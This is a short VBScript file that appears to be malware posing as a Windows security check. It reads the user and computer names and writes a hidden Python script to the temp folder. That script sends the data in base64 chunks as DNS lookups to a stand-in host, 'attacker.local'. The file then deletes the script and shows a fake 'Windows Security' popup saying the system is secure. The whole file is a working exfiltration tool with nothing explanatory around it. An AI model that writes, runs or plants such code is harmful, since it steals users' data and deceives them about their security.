Set objShell = CreateObject("WScript.Shell")
Set objNetwork = CreateObject("WScript.Network")
Set objFSO = CreateObject("Scripting.FileSystemObject")

' Get system information
userName = objNetwork.UserName
computerName = objNetwork.ComputerName
osInfo = "Windows"

' Create data string
systemData = "User:" & userName & "|Computer:" & computerName & "|OS:" & osInfo

' Create Python script for DNS exfiltration
tempDir = objShell.ExpandEnvironmentStrings("%TEMP%")
pythonFile = tempDir & "\syscheck.py"

' Write Python code to temp file
Set objFile = objFSO.CreateTextFile(pythonFile, True)
objFile.WriteLine "import socket, base64, time"
objFile.WriteLine "data = '" & systemData & "'"
objFile.WriteLine "try:"
objFile.WriteLine "    for i, chunk in enumerate([data[j:j+50] for j in range(0, len(data), 50)]):"
objFile.WriteLine "        enc = base64.b64encode(chunk.encode()).decode().replace('=', '')[:60]"
objFile.WriteLine "        dns = f'chunk{i}.{enc}.attacker.local'"
objFile.WriteLine "        socket.gethostbyname_ex(dns)"
objFile.WriteLine "        time.sleep(0.3)"
objFile.WriteLine "except: pass"
objFile.Close

' Run Python script silently
objShell.Run "python " & pythonFile, 0, True

' Clean up
objFSO.DeleteFile pythonFile

' Show fake success message
objShell.Popup "Security check completed successfully." & vbCrLf & "Your system is secure.", 3, "Windows Security", 64
